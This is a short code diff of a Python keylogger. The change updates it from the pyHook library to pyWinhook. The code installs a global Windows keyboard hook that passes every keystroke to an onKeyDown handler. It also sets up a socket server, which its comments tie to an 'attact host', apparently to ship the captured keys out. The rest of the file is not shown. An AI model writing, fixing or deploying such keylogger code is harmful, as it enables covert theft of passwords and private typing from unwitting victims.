@@ -1,4 +1,4 @@
-import pyHook, pythoncom, socket
+import pyWinhook, pythoncom, socket
 
 ##create a server how lisen the attact host
 server = socket.socket()
@@ -13,7 +13,7 @@ def onKeyDown(e):
     ##print(s, file =open("log.txt", "a")) 
     return 1
 
-hm=pyHook.HookManager()
+hm=pyWinhook.HookManager()
 hm.HookKeyboard()
 
 #evry evend from the keybord will pawer onKeyDown function
